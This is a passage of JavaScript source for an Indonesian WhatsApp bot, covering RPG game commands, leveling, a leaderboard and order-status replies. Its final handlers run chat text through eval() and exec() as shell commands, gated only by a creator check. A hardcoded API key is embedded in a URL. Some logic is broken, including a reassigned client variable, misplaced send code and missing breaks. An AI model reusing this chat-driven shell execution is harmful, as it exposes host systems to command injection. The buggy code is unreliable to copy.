_rumah.splice(rumahrpg.getOrangPosition(sender, _rumah), 1)
fs.writeFileSync('./database/Orangrpg.json', JSON.stringify(_rumah))
rumahrpg.addOrangUser(sender, time, rosen, _rumah)
m.reply('Berhasil Membeli Rumah Biasa')
}
}
if(q === 'mewah') {
if(orang === 'Seorang Raja'){ return m.reply('Anda Sudah Memiliki Kerajaan, Tidak Bisa Merendah') }
if(orang === 'Orang Kaya'){ return m.reply('Anda Sudah Membeli Rumah Ini') }
if(userPoton < 100000){ return m.reply('Uang Anda Tidak Cukup Atau Kurang dari Rp100.000') }
if(userPoton > 100000){
fall = 100000
Lily = fall * 1
const rosen = 'Rumah Mewah'
uangAdd(sender, Lily) 
_rumah.splice(rumahrpg.getOrangPosition(sender, _rumah), 1)
fs.writeFileSync('./database/Orangrpg.json', JSON.stringify(_rumah))
rumahrpg.addOrangUser(sender, time, rosen, _rumah)
m.reply('Berhasil Membeli Rumah Mewah')
}
}
if(q === 'kerajaan') {
if(orang === 'Seorang Raja'){ return m.reply('Anda Sudah Membeli Rumah Ini') }
if(userPoton < 150000){ return m.reply('Uang Anda Tidak Cukup Atau Kurang dari Rp150.000') }
if(userPoton > 150000){
fall = 150000
Lily = fall * 1
const rosen = 'Kerajaan'
uangAdd(sender, Lily) 
_rumah.splice(rumahrpg.getOrangPosition(sender, _rumah), 1)
fs.writeFileSync('./database/Orangrpg.json', JSON.stringify(_rumah))
rumahrpg.addOrangUser(sender, time, rosen, _rumah)
m.reply('Berhasil Membeli Kerajaan')
}
}
rplimitAdd(sender, rpliminya)
break
}
case 'level': { 
if (!isGroup) return m.reply('Group Only')
if (!isLevelingOn) return await m.reply('Fitur leveling belum diaktifkan!')
let userLevel = level.getLevelingLevel(sender, _level)
let userXp = level.getLevelingXp(sender, _level)
let requiredXp = 10 * Math.pow(userLevel, 2) + 50 * userLevel + 100
let userRank = level.getUserRank(sender, _level)
try {
profilePic = await Lily.profilePictureUrl(sender, image)
} catch {
profilePic = 'https://telegra.ph/file/392d26407fc69a4a3df09.jpg'
let bg = 'https://telegra.ph/file/78c066c2a79edf2f71227.jpg'
let buffer = await getBuffer(`https://api.lolhuman.xyz/api/rank?apikey=90530678eba6a8b22c299532&img=${profilePic}&background=${bg}&username=${pushname}&level=${userLevel}&ranking=${Number(userRank)}&currxp=${userXp}&xpneed=${requiredXp}`)
let teks = `*「 LEVEL 」*\n\n➸ *Nama :* ${pushname}\n➸ *Xp :* ${userXp} / ${requiredXp}\n➸ *Level :* ${userLevel}\n➸ *Role*: *${role}*\n➸ *Gumption*: *${userPotion}*\n➸ *Heal*: *${userHeal}*\n➸ *Crystal*: *${userCrystal}*\n\n*Note : Kumpulin Xp Jika Ingin Menaikkan Level*`
Lily.sendImage(m.chat, buffer, teks, m)
}
}
break
case 'leveling': {
if (!isGroup) return m.reply(mess.prem)
if (q === 'on') {
if (isLevelingOn) return m.reply('Fitur leveling telah diaktifkan sebelumnya.')
_leveling.push(from)
fs.writeFileSync('./database/leveling.json', JSON.stringify(_leveling))
m.reply('Fitur leveling berhasil diaktifkan.')
} else if (q === 'off') {
var anup = _leveling.indexOf(from)
_leveling.splice(anup, 1)
fs.writeFileSync('./database/leveling.json', JSON.stringify(_leveling))
m.reply('Fitur leveling berhasil dimatikan.')
} else {
m.reply('Pilih on atau off!')
}
}
break
case 'leaderboard': { //Cek Leaderboard
if (!isGroup) return m.reply(mess.group)
if (!isLevelingOn) return await m.reply('Fitur leveling belum diaktifkan!') 
const resp = _level
_level.sort((a, b) => (a.xp < b.xp) ? 1 : -1)
let leaderboard =  '-----[ *LEADERBOARD* ]----\n\n'
try {
for (let i = 0; i < 10; i++) {
var roles = 'Warrior III'
if (resp[i].level <= 5) {
roles = 'Warrior II'
} else if (resp[i].level <= 10) {
roles = 'Warrior I'
} else if (resp[i].level <= 15) {
roles = 'Elite III'
} else if (resp[i].level <= 20) {
roles = 'Elite II'
} else if (resp[i].level <= 25) {
roles = 'Elite I'
} else if (resp[i].level <= 30) {
roles = 'Master III'
} else if (resp[i].level <= 35) {
roles = 'Master II'
} else if (resp[i].level <= 40) {
roles = 'Master I'
} else if (resp[i].level <= 45) {
roles = 'GrandMaster III'
} else if (resp[i].level <= 50) {
roles = 'GrandMaster II'
} else if (resp[i].level <= 55) {
roles = 'GrandMaster I'
} else if (resp[i].level <= 60) {
roles = 'Epic III'
} else if (resp[i].level <= 65) {
roles = 'Epic II'
} else if (resp[i].level <= 70) {
roles = 'Epic I'
} else if (resp[i].level <= 75) {
roles = 'Legend III'
} else if (resp[i].level <= 80) {
roles = 'Legend II'
} else if (resp[i].level <= 85) {
roles = 'Legend I'
} else if (resp[i].level <= 90) {
roles = 'Mythic'
} else if (resp[i].level <= 95) {
roles = 'Mythical Glory'
} else if (resp[i].level >= 100) {
roles = 'Immortal'
} 

leaderboard += `➸ ${i + 1}. wa.me/${_level[i].id.replace('@s.whatsapp.net', '')}\n➸ *Xp :* ${_level[i].xp}\n➸ *Level :* ${_level[i].level}\n➸ *Role*: *${roles}*\n➸ *Gumption*: *${userPotion}*\n➸ *Heal*: *${userHeal}*\n➸ *Crystal*: *${userCrystal}*\n\n`
}
m.reply(leaderboard)
} catch (err) {
console.error(err)
m.reply('_Perlu setidaknya 10 user yang memiliki level di database!_')
}
}
break
case 'cheatlevel': {
if(!isPremium) { return m.reply(mess.prem) }
cheat = randomNomor(10000)
level.addLevelingXp(sender, cheat, _level)
m.reply(`Sukses Menambah ${cheat} Xp`)
}  
             break
case 'rpbalance': { 
 m.reply(`Limit Game RP : ${userPotan}/${rplimitawal}\nBalance : ${formatmoney(userPoton ? userPoton : "Rp0,00")}`)
}   
             case 'adventure': {
if(userPotan < 1){ return m.reply(`Limit Kmu Sudah Habis`)}
if (!isBrave) return  m.reply(`Anda Tidak Terdaftar Sebagai Role Player Dalam Database, Ketik ${prefix}joinrp Nama RolePlay Anda`)
if (!isGroup) return m.reply('Group Only')
if(userHeal < 25){ return m.reply(`Maaf Heal Anda Tersisa ${userHeal}, Silahkan Melakukan Healing`)}
ngab = ['Longsor', 'Letusan Gunung', 'Tsunami', 'Gempa Bumi', 'Meteor', 'Demon']
const sesuatu = ngab[Math.floor(Math.random() * ngab.length)]
getId = namerpg.getNameId(sender, _name)
getReason = namerpg.getNameReason(getId, _name)
await setTimeout(() => {
  m.reply(`${getReason} Sedang Berpetualang Mencari harta karun`)
}, 2000)
await setTimeout(() => {
  m.reply(`Tiba Tiba Ada ${sesuatu}`)
}, 2500)
await setTimeout(() => {
  m.reply(`MENGHINDARR!!!`)
}, 3000)
const dungeon = ['Whetstone', 'Willow Field', 'Rodeo', 'Verdant Blufs', 'Bull Holland', 'Fallen Tree', 'Dellnort', 'Verona Lush', 'Leafy Hollow', 'Chilliad Dome', 'Garcia', 'Pine Valley', 'Santa Florals', 'Guvero East', 'Cranbarry', 'Junever', 'Aldea Malvada', 'Green Palms', 'Green Oasis', 'Fort Carson', 'Prickel Pine', 'Pilson Meadow', 'Boca Roca', 'Rocksore East', 'Camel Toe', 'Hanky Panky', 'Fern Ridge', 'Montgomerry', 'Flint Yankton', 'Vespucci', 'fortress city', 'ravines valley', 'horizon valley', 'cyber city', 'end city', 'templar city', 'pochinki', 'peak', 'Vertical Zone', 'Sentainel Country', 'Night City', 'Flush City', 'Royals Canyon', 'Blackburn', 'Peterborough', 'Tarnstead', 'Jarren’s', 'Outpost', 'Landow', 'Nearon', 'Kincardine', 'Aysgarth', 'Veritas', 'Openshaw', 'Bredwardine', 'Berkton', 'Wolford', 'Norwich', 'Kald', 'Solaris', 'Kilead', 'Pitmerden', 'Acomb', 'Eldham', 'Warcester', 'Lingmell', 'Kilead', 'Cromerth', 'Wingston', 'Garmsby', 'Kingcardine', 'Perthlochry', 'Frostford', 'Hillford', 'Hardersfield', 'Tarrin', 'Holmfirth', 'Caerleon', 'Elisyum', 'Ballaeter', 'Penshaw', 'Bradford', 'Wigston', 'Accreton', 'Kameeraska', 'Ferncombe', 'Kilerth', 'Erostey', 'Carran', 'Jongvale', 'Larnwick', 'Queenstown', 'Whaelrdrake', 'Baerney', 'Wingston', 'Arkney', 'Strongfair', 'Lowestoft', 'Beggar’s Hole', 'Shepshed', 'Perthlochry', 'Ironforge', 'Tywardreath', 'Pontheugh', 'Foolshope', 'Hull', 'Dalmerlington', 'Aucteraden', 'Woodpine', 'Millstone', 'Windermere', 'Lancaster', 'Kirkwall', 'Rotherhithe', 'Astrakhan', 'Watford', 'Ritherhithe', 'Krosstoen', 'Pella’s', 'Wish', 'Grimsby', 'Ayrith', 'Ampleforth', 'Skystead', 'Eanverness', 'Penshaw', 'Peatsland', 'Astrakane', 'Pontybridge', 'Caershire', 'Snowbush', 'Sutton', 'Northwich', 'Hogsfeet', 'Claethorpes', 'Sudbury', 'Cherrytown', 'Blue Field', 'Orrinshire', 'Aempleforth', 'Garrigill', 'Jedburgh', 'Eastbourne', 'Taedmorden', 'Venzor', 'Grasmere', 'Ubbin', 'Falls', 'Violl’s Garden', 'Glanchester', 'Bailymena', 'Arkkukari', 'Skargness', 'Cardend', 'Llanybydder', 'Faversham', 'Yellowseed', 'Carlisle', 'Cirencester', 'Aramoor', 'Furness', 'Kincardine', 'Rotherham', 'Emelle', 'Boroughton', 'Carran', 'Ffestiniog', 'Mansfield', 'Huthwaite', 'Marclesfield', 'Pavv', 'Squall’s End', 'Glenarm', 'Dragontail', 'Moressley', 'Hardersfield', 'Gilramore', 'Aria', 'Ecrin', 'Clare View Point', 'Blackburn', 'Oakheart', 'Doonatel', 'Broughton', 'Carlisle', 'Murlayfield', 'Nuxvar']
const ad = dungeon[Math.floor(Math.random() * dungeon.length)]
anu = JSON.parse(fs.readFileSync('./database/adventure/avden.json'))
randIndex = anu[Math.floor(Math.random() * anu.length)]
hasil = await getBuffer(randIndex)
adven = Math.floor(Math.random() * (25 - 25 + 2) + 90)
level.addLevelingXp(sender, adven, _level)
money = Math.floor(Math.random() * (150 - 25 + 2) + 20)
addUang(sender, money)
helad = randomNomor(10, 30)
poti = Math.floor(Math.random() * 5)
addPotioUser(sender, poti)
await setTimeout(() => {
teks = `◪ *「 DEATH 」

├─ ❏ *Tempat : ${ad}*
├─ ❏ *Player : ${getReason}*
├─ ❏ *MONEY : Rp.${money}*
├─ ❏ *EXP : ${adven}Xp*
├─ ❏ *Heal : -${helad}*
└─ ❏ *Gumption : ${poti}*`
Lily.sendImage(m.chat, hasil, teks, m)
}, 4000)
await healAdd(sender, helad)
rplimitAdd(sender, rpliminya)
}
break
case 'gaincrystal': {
if(userPotan < 1){ return m.reply(`Limit Kmu Sudah Habis`)}
if (!isBrave) return  m.reply(`Anda Tidak Terdaftar Sebagai Role Player Dalam Database, Ketik ${prefix}joinrp Nama RolePlay Anda`)
if (!isGroup) return m.reply(mess.group)
if(userHeal < 25){ return m.reply(`Maaf Heal Anda Tersisa ${userHeal}, Silahkan Melakukan Healing`)}
getId = namerpg.getNameId(sender, _name)
getReason = namerpg.getNameReason(getId, _name)
ngab = ['Goa', 'Lembah', 'Dasar Laut', 'Gunung Berapi', 'Rumah Orang Kaya', 'Bank']
const tmpat = ngab[Math.floor(Math.random() * ngab.length)]
var mning = randomNomor(1000)
addCrysUser(sender, mning)
//TRAGEDI
if(tmpat === 'Goa'){
tragedi = 'Goanya Runtuh'
}
if(tmpat === 'Lembah'){
tragedi = 'Lembahnya Longsor'
}
if(tmpat === 'Dasar Laut'){
tragedi = 'Terjadi Tsunami'
}
if(tmpat === 'Gunung Berapi'){
tragedi = 'Gunungnya Meletus'
}
if(tmpat === 'Rumah Orang Kaya'){
tragedi = 'Sistem Keamanan Aktif'
}
if(tmpat === 'Bank'){
tragedi = 'Security Datang'
}
//AKSI
if(tragedi === 'Security Datang'){
aksi = 'Melarikan Diri Dan Berhasil Menghindari Security'
}
if(tragedi === 'Sistem Keamanan Aktif'){
aksi = 'Bersembunyi Dan Berhasil Lari'
}
if(tragedi === 'Gunungnya Meletus'){
aksi = 'Melindungi Diri Dan Berhasil Selamat'
}
if(tragedi === 'Terjadi Tsunami'){
aksi = 'Terbawa Arus Tetapi Selamat Disuatu Pulau'
}
if(tragedi === 'Lembahnya Longsor'){
aksi = 'Terkubur Dalam Lembah Tetapi Berhasil Keluar'
}
if(tragedi === 'Goanya Runtuh'){
aksi = 'Tertimbun Bebatuan Dalam Goa Tetapi Berhasil Keluar'
}
//BACKGROUND
if(tmpat === 'Goa'){
bckgrn = 'https://telegra.ph/file/5da8f6663208f4866212f.jpg'
}
if(tmpat === 'Lembah'){
bckgrn = 'Lembahnya Longsor'
}
if(tmpat === 'Dasar Laut'){
bckgrn = 'https://telegra.ph/file/a2de4d61d8917978a50ba.jpg'
}
if(tmpat === 'Gunung Berapi'){
bckgrn = 'https://telegra.ph/file/28d3b12fa1b39f986ca76.jpg'
}
if(tmpat === 'Rumah Orang Kaya'){
bckgrn = 'https://telegra.ph/file/400374a71cc5bdde21e7d.jpg'
}
if(tmpat === 'Bank'){
bckgrn = 'https://telegra.ph/file/f8ba56e6648780abc63eb.jpg'
}
buffbck = await getBuffer(bckgrn)
await setTimeout(() => {
  m.reply(`${getReason} Sedang Masuk Ke ${tmpat}`)
}, 1000)
await setTimeout(() => {
  m.reply(`${getReason} Mengambil Crystal`)
}, 2000)
await setTimeout(() => {
  m.reply(`Tiba-Tiba ${tragedi}`)
}, 3000)
await setTimeout(() => {
Lily.sendImage(m.chat, buffbck, `◪ *「 MISSION COMPLETED 」*

├─ ❏ *Player* : *${getReason}*
├─ ❏ *Get Crystal* : _${mning} 💎_
├─ ❏ *Tempat* : *${tmpat}*
└─ ❏ *Aksi* : *${aksi}*`,m)
}, 4000)
rplimitAdd(sender, rpliminya)
break
} 
case 'mining': {
 if(userPotan < 1){ return Lily.sendMessage(from, `Limit Kmu Sudah Habis`, text, { quoted: fdoc })}
var mining = randomNomor(1000)
addUang(sender, mining)
await m.reply(`*Selamat Kamu Mendapatkan*: _Rp ${mining} 💰_`)
rplimitAdd(sender, rpliminya)
}
//===================《 BATAS CASE 》=====================\\
default:


if ((budy) && ["proses", "Proses",].includes(budy) && !isCmd) {
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (!isAdmins) return reply('Fitur Khusus admin!')
if (!m.quoted) return reply('Reply pesanan yang akan proses')
let tek = m.quoted ? quoted.text : quoted.text.split(args[0])[1]
let proses = `「 *TRANSAKSI PENDING* 」\n\n\`\`\`📆 TANGGAL : @tanggal\n⌚ JAM : @jam\n✨ STATUS : Pending\`\`\`\n\n📝 Catatan :\n@pesanan\n\nPesanan @user sedang di proses!`
const getTextP = getTextSetProses(m.chat, set_proses);
if (getTextP !== undefined) {
var anunya = (getTextP.replace('@pesanan', tek ? tek : '-').replace('@user', '@' + m.quoted.sender.split("@")[0]).replace('@jam', timee).replace('@tanggal', tanggal(new Date())).replace('@user', '@' + m.quoted.sender.split("@")[0]))
Lily.sendTextWithMentions(m.chat, anunya, m)
} else {
Lily.sendTextWithMentions(m.chat, (proses.replace('@pesanan', tek ? tek : '-').replace('@user', '@' + m.quoted.sender.split("@")[0]).replace('@jam', timee).replace('@tanggal', tanggal(new Date())).replace('@user', '@' + m.quoted.sender.split("@")[0])), m)}
}

if ((budy) && ['done', "Done"].includes(budy) && !isCmd) {
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (!isAdmins) return reply('Fitur Khusus admin!')
if (!m.quoted) return reply('Reply pesanan yang telah di proses')
let tek = m.quoted ? quoted.text : quoted.text.split(args[0])[1]
let sukses = `「 *TRANSAKSI BERHASIL* 」\n\n\`\`\`📆 TANGGAL : @tanggal\n⌚ JAM : @jam\n✨ STATUS : Berhasil\`\`\`\n\nTerimakasih @user Next Order ya🙏`
const getTextD = getTextSetDone(m.chat, set_done);
if (getTextD !== undefined) {
var anunya = (getTextD.replace('@pesanan', tek ? tek : '-').replace('@user', '@' + m.quoted.sender.split("@")[0]).replace('@jam', timee).replace('@tanggal', tanggal(new Date())).replace('@user', '@' + m.quoted.sender.split("@")[0]))
Lily.sendTextWithMentions(m.chat, anunya, m)
} else {
Lily.sendTextWithMentions(m.chat, (sukses.replace('@pesanan', tek ? tek : '-').replace('@user', '@' + m.quoted.sender.split("@")[0]).replace('@jam', timee).replace('@tanggal', tanggal(new Date())).replace('@user', '@' + m.quoted.sender.split("@")[0])), m)}
}


if (budy.startsWith('=>')) {
if (!isCreator) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)
}
return m.reply(bang)
}
try {
m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
m.reply(String(e))
}
}

if (budy.startsWith('>')) {
if (!isCreator) return
let kode = budy.trim().split(/ +/)[0]
let teks
try {
teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
} catch (e) {
teks = e
} finally {
await m.reply(require('util').format(teks))
}
}

if (budy.startsWith('$')) {
if (!isCreator) return
exec(budy.slice(2), (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) return m.reply(stdout)
})
}
}

} catch (err) {
console.log(util.format(err))
}
}


let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(`Update ${__filename}`)
delete require.cache[file]
require(file)
})
